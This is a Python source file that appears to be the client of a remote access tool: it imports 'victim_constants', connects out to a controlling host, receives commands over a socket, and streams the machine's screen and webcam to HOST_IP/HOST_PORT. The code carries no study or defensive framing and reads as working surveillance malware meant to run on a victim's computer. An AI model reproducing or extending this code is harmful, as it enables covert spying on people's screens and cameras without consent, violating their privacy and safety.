import socket
from victim_constants import *
from constants import *
import socket
import ScreenSharing.sharer.sharer as scSharer
import WebCamSharing.sharer.sharer as wcSharer

class Host:

    # Manages all the host abilities

    def __init__(self, IP, PORT):
        """
        param 1: the host ip
        param 2: the host port
        
        param 1 type: str
        param 2 type: int
        """

        self.IP = IP
        self.PORT = PORT
        self.commandsSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.screenShareSoc = None
        self.webCamSoc = None

    def connectToServer(self):
        """
        Connects to the server
        """

        print("Connecting to host...")

        self.commandsSocket.connect((self.IP, self.PORT))

        # NOTE: not necessary anymore because the server can understand be itself which socket is the commands channel
        # soc.send(COMMANDS_CHANNEL.encode()) # Tell the server we want to use this socket connection as the commands channel

        print("Successfully connected!")


    def getCommand(self):
        """
        Receives the command from the server

        return: the command
        return type: str
        """

        command = self.commandsSocket.recv(1024).decode()
        print(f"Recv command! : {command}")
        return command


    def shareScreen(self):
        """
        Starts sharing the screen to the host
        """
        
        self.screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.screenShareSoc.connect((HOST_IP, HOST_PORT))

        # Tell the server we want to use this socket connection as the screenShare channel
        self.screenShareSoc.send(SCREEN_SHARE_CHANNEL.encode())

        scSharer.shareScreen(self.screenShareSoc)
        # Closes the connection
        self.screenShareSoc.close()
        self.screenShareSoc = None

    def shareWebCam(self):
        """
        Starts sharing web camera to the host
        """

        self.webCamSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.webCamSoc.connect((HOST_IP, HOST_PORT))

        # Tell the server we want to use this socket connection as the web camera sharing channel
        self.webCamSoc.send(WEB_CAM_SHARE_CHANNEL.encode())

        wcSharer.shareWebCam(self.webCamSoc)
        # Closes the connection
        self.webCamSoc.close()
        self.webCamSoc = None

    def isWebCamSharingAvaliable(self):
        """
        Returns if the screen sharing is available to sharing right now        
        
        return type: bool
        """

        return self.webCamSoc == None

    def isScreenSharingAvaliable(self):
        """
        Returns if the web camera sharing is available to sharing right now        
        
        return type: bool
        """
        
        return self.screenShareSoc == None